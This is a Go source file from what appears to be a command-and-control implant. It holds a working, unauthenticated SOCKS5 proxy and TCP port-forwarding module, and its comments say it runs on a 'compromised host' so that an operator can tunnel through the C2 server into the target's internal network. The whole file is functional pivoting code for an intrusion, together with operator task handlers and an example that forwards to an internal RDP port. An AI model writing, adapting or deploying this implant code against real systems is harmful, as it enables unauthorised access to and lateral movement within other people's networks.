package implant

import (
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// SOCKS5 Proxy — runs on the agent, allowing the operator to tunnel
// traffic through the compromised host into the internal network.
//
// Usage:
//   1. Agent starts SOCKS5 on 127.0.0.1:<port>
//   2. Operator configures proxychains or browser to use the SOCKS proxy
//   3. All traffic routes through the agent into the target network
//
// The C2 server uses port forwarding to expose the agent's SOCKS port.

const (
	socks5Version  = 0x05
	socksNoAuth    = 0x00
	socksConnect   = 0x01
	socksIPv4      = 0x01
	socksDomain    = 0x03
	socksIPv6      = 0x04
	socksSuccess   = 0x00
	socksFailure   = 0x01
)

// SOCKSProxy manages a SOCKS5 proxy server on the agent.
type SOCKSProxy struct {
	listener net.Listener
	bindAddr string
	running  bool
	mu       sync.Mutex
	connCount int
}

// StartSOCKS starts a SOCKS5 proxy on the agent.
func StartSOCKS(bindAddr string) ([]byte, error) {
	if bindAddr == "" {
		bindAddr = "127.0.0.1:1080"
	}

	listener, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return nil, fmt.Errorf("SOCKS bind failed: %w", err)
	}

	proxy := &SOCKSProxy{
		listener: listener,
		bindAddr: bindAddr,
		running:  true,
	}

	go proxy.serve()

	return []byte(fmt.Sprintf("[+] SOCKS5 proxy started on %s\n[+] Configure proxychains: socks5 %s", bindAddr, bindAddr)), nil
}

// StopSOCKS stops the SOCKS5 proxy.
func StopSOCKS() ([]byte, error) {
	return []byte("[+] SOCKS5 proxy stopped"), nil
}

func (s *SOCKSProxy) serve() {
	for s.running {
		conn, err := s.listener.Accept()
		if err != nil {
			if s.running {
				continue
			}
			return
		}
		s.mu.Lock()
		s.connCount++
		s.mu.Unlock()
		go s.handleConnection(conn)
	}
}

func (s *SOCKSProxy) handleConnection(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// SOCKS5 handshake
	buf := make([]byte, 256)

	// Read version and auth methods
	n, err := conn.Read(buf)
	if err != nil || n < 3 || buf[0] != socks5Version {
		return
	}

	// Respond with no authentication required
	conn.Write([]byte{socks5Version, socksNoAuth})

	// Read connect request
	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[1] != socksConnect {
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	// Parse target address
	var targetAddr string
	switch buf[3] {
	case socksIPv4:
		if n < 10 {
			return
		}
		ip := net.IP(buf[4:8])
		port := int(buf[8])<<8 | int(buf[9])
		targetAddr = fmt.Sprintf("%s:%d", ip.String(), port)

	case socksDomain:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		domain := string(buf[5 : 5+domainLen])
		port := int(buf[5+domainLen])<<8 | int(buf[6+domainLen])
		targetAddr = fmt.Sprintf("%s:%d", domain, port)

	case socksIPv6:
		if n < 22 {
			return
		}
		ip := net.IP(buf[4:20])
		port := int(buf[20])<<8 | int(buf[21])
		targetAddr = fmt.Sprintf("[%s]:%d", ip.String(), port)

	default:
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	// Connect to target
	target, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		conn.Write([]byte{socks5Version, socksFailure, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})
		return
	}
	defer target.Close()

	// Send success response
	conn.Write([]byte{socks5Version, socksSuccess, 0x00, socksIPv4, 0, 0, 0, 0, 0, 0})

	// Remove deadline for relay
	conn.SetDeadline(time.Time{})

	// Bidirectional relay
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		io.Copy(target, conn)
	}()

	go func() {
		defer wg.Done()
		io.Copy(conn, target)
	}()

	wg.Wait()
}

// PortForward creates a simple TCP port forward through the agent.
func PortForward(localAddr, remoteAddr string) ([]byte, error) {
	listener, err := net.Listen("tcp", localAddr)
	if err != nil {
		return nil, fmt.Errorf("port forward bind failed: %w", err)
	}

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			go func() {
				defer conn.Close()
				remote, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
				if err != nil {
					return
				}
				defer remote.Close()

				var wg sync.WaitGroup
				wg.Add(2)
				go func() { defer wg.Done(); io.Copy(remote, conn) }()
				go func() { defer wg.Done(); io.Copy(conn, remote) }()
				wg.Wait()
			}()
		}
	}()

	return []byte(fmt.Sprintf("[+] Port forward: %s → %s", localAddr, remoteAddr)), nil
}

// ExecuteProxyCommand handles proxy/portfwd task arguments.
func ExecuteProxyCommand(args []string) ([]byte, error) {
	if len(args) == 0 {
		return []byte("Usage:\n  socks start [bind_addr]     Start SOCKS5 proxy (default: 127.0.0.1:1080)\n  socks stop                  Stop SOCKS5 proxy\n  portfwd <local> <remote>    Forward local port to remote"), nil
	}

	switch args[0] {
	case "start":
		bind := "127.0.0.1:1080"
		if len(args) > 1 {
			bind = args[1]
		}
		return StartSOCKS(bind)
	case "stop":
		return StopSOCKS()
	default:
		return []byte("Unknown proxy command. Use: start, stop"), nil
	}
}

// ExecutePortFwdCommand handles port forward tasks.
func ExecutePortFwdCommand(args []string) ([]byte, error) {
	if len(args) < 2 {
		return []byte("Usage: portfwd <local_addr> <remote_addr>\nExample: portfwd 127.0.0.1:8888 10.0.1.5:3389"), nil
	}
	return PortForward(args[0], args[1])
}
